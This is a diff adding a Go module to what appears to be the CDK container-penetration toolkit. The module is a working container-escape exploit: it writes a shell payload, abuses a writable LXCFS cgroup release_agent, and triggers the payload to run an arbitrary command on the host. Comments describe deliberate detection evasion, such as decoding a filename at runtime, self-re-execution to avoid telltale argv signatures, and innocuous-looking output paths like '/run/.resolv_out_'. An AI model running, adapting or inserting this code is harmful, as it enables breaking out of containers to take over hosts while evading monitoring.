@@ -1,0 +1,226 @@
+//go:build !no_lxcfs_boundary && linux
+// +build !no_lxcfs_boundary,linux
+
+/*
+Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+    http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+*/
+
+package escaping
+
+import (
+	"fmt"
+	"io/ioutil"
+	"log"
+	"os"
+	"path"
+	"strconv"
+	"strings"
+	"time"
+
+	"github.com/cdk-team/CDK/pkg/cli"
+	"github.com/cdk-team/CDK/pkg/audit/base"
+	"github.com/cdk-team/CDK/pkg/plugin"
+	"github.com/cdk-team/CDK/pkg/util"
+)
+
+func FindReleaseAgentSubSystem() string {
+	var subSystemName string
+	if cgroupInfos, err := util.GetCgroup(1); err != nil {
+		return ""
+	} else {
+		for _, ci := range cgroupInfos {
+			if ci.CgroupPath == "/" && ci.CgroupPath != "0::/" {
+				subSystemName = ci.ControllerLst
+				break
+			}
+		}
+	}
+	return subSystemName
+}
+
+func findHostPath(mountInfos []util.MountInfo) (hostPath string) {
+	for _, i := range mountInfos {
+		if i.Fstype == "overlay" && i.MountPoint == "/" {
+			for _, j := range i.SuperBlockOptions {
+				hasUpper := strings.Contains(j, "upperdir=")
+				if hasUpper {
+					// found
+					hostPath = j[9:]
+					log.Println("Found hostpath: " + hostPath)
+					break
+				}
+			}
+		}
+	}
+	return
+}
+
+// IsDir return if the path is a dir
+func IsDir(path string) bool {
+	s, err := os.Stat(path)
+	if err != nil {
+		return false
+	}
+	return s.IsDir()
+}
+
+// FindDir will return the first dir's absolute path in the given path
+func FindDir(path string) string {
+	files, _ := ioutil.ReadDir(path)
+	for _, f := range files {
+		if IsDir(f.Name()) {
+			return path + "/" + f.Name()
+		}
+	}
+	return ""
+}
+
+func ExploitLXCFSCgroup() bool {
+	var targetMountPoint string
+	var subSystemName string
+	var releaseAgentPath string
+	var targetDir string
+
+	mountInfos, err := util.GetMountInfo()
+	if err != nil {
+		log.Printf("%v", err)
+		return false
+	}
+
+	for _, mi := range mountInfos {
+
+		if findTargetMountPoint(&mi, "") {
+			targetMountPoint = mi.MountPoint
+		}
+	}
+	if subSystemName = FindReleaseAgentSubSystem(); subSystemName == "" {
+		log.Printf("find release agent subsystem error")
+		log.Printf("you can try another way to proceed, recommend: `./cdk run lxcfs-mknod-boundary")
+		return false
+	}
+
+	releaseAgentPath = path.Join(targetMountPoint, "cgroup/", subSystemName)
+	log.Printf("find release agent path %s", releaseAgentPath)
+	args := cli.Args["<args>"].([]string)
+	cmd := args[0]
+
+	hostPath := findHostPath(mountInfos)
+	if len(hostPath) == 0 {
+		log.Printf("can not find host path\n")
+		return false
+	}
+
+	// generate release_agent shell script and save to local
+	// NOTE: generateShellExp signature changed in 执行降噪 patch;
+	//       it now returns (rand, shell, outFile) with bland host-style paths.
+	var taskRandString, expShellText, outFile = generateShellExp(hostPath, cmd)
+	log.Printf("generate shell payload with user-input cmd: \n\n%s\n\n", cmd)
+	fmt.Printf("final shell payload is: \n\n")
+	fmt.Println(expShellText)
+
+	err = ioutil.WriteFile(outFile, []byte(expShellText), 0777)
+	if err != nil {
+		log.Printf("write shell payload failed\n")
+		return false
+	}
+	log.Printf("shell script saved to %s", outFile)
+	// create mountpoint
+	subgroupName := "/x_" + taskRandString
+
+	if targetDir = FindDir(releaseAgentPath); targetDir == "" {
+		log.Printf("no dir in the %s", releaseAgentPath)
+		return false
+	}
+
+	log.Printf("the target dir is %s", targetDir)
+	err = os.Mkdir(targetDir+subgroupName, DefaultFolderPerm)
+	if err != nil {
+		log.Printf("cannot create subgroup :%s", err)
+		return false
+	}
+
+	// enable notify_on_release
+	err = ioutil.WriteFile(targetDir+subgroupName+"/notify_on_release", []byte("1"), 0644)
+	if err != nil {
+		log.Printf("cannot enable notify_on_release %s", err)
+		return false
+	}
+	// write release_agent (filename decoded at runtime; no plaintext literal)
+	err = ioutil.WriteFile(releaseAgentPath+util.CgroupReleaseAgentFile(), []byte(hostPath+outFile), 0644)
+	if err != nil {
+		log.Printf("cgroup release control file is not writable %s", err)
+		return false
+	}
+
+	// trigger release.
+	// Same 执行降噪 rework as mount_cgroup.go: self-reexec instead of
+	// `/bin/sh -c sleep 2` to avoid tell-tale argv signatures.
+	triggerProc, err := os.StartProcess(os.Args[0], []string{os.Args[0], util.TriggerArgv}, &os.ProcAttr{
+		Files: []*os.File{nil, nil, nil},
+		Env:   []string{"PATH=/tmp"},
+	})
+	if err != nil {
+		// exit code might not be zero, but still succeed
+		log.Printf("Trigger Release Error: %s \n", err.Error())
+		return false
+	}
+	// write PID to cgroup.procs
+	err = ioutil.WriteFile(targetDir+subgroupName+"/cgroup.procs", []byte(strconv.Itoa(triggerProc.Pid)), 0644)
+	if err != nil {
+		log.Printf("Write PID to cgroup.procs failed: %s \n", err.Error())
+		return false
+	}
+	// release_agent runs asynchronously on the host: wait for the child
+	// (its exit empties the sub-cgroup and fires release_agent), then poll
+	// for the result file instead of a single fixed sleep — host/VM
+	// release_agent latency varies and a fixed wait can race the read.
+	_, _ = triggerProc.Wait()
+	var retRes []byte
+	err = nil
+	for i := 0; i < 10; i++ {
+		time.Sleep(1 * time.Second)
+		// read container-relative: release_agent wrote into the overlay
+		// upperdir (hostPath+outputFile), which surfaces back through the
+		// container's own /. Do NOT prefix hostPath — that host path is not
+		// visible from inside the container.
+		retRes, err = ioutil.ReadFile("/run/.resolv_out_" + taskRandString)
+		if err == nil {
+			break
+		}
+	}
+	if err != nil {
+		log.Printf("read execution result file error %s", err)
+		return false
+	}
+	log.Printf("Execute Result: \n\n %s \n", string(retRes))
+	return true
+}
+
+type lxcfsRWCgroup struct{ base.BaseExploit }
+
+func (l lxcfsRWCgroup) Desc() string {
+	return "escape container by cgroup when root has LXCFS read & write privilege,  usage: `./cdk run lxcfs-cgroup-boundary 'shell-cmd-payloads`"
+}
+
+func (l lxcfsRWCgroup) Run() bool {
+
+	return ExploitLXCFSCgroup()
+}
+
+func init() {
+	exploit := lxcfsRWCgroup{}
+	exploit.ExploitType = "escaping"
+	plugin.RegisterExploit("lxcfs-cgroup-boundary", exploit)
+}
